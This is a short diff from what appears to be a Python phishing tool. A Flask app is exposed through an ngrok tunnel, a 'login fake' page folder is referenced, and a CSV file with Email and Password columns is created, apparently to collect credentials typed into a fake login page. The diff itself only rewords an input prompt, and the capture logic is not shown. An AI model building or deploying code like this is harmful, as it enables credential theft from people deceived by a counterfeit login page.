@@ -7,7 +7,8 @@ Link=ngrok.connect("5000")
 Link
 
 app = Flask(__name__)
-path=input("Your Path : Follow Format this <Your Path To>/login fake/ ")
+print("Follow This Format : <Your Path To>/login fake/")
+path=input("Your Path :  ")
 with open(path+"Email+Password.csv",mode='w') as f :
     f.write("""Email , Password""")
     f.close()
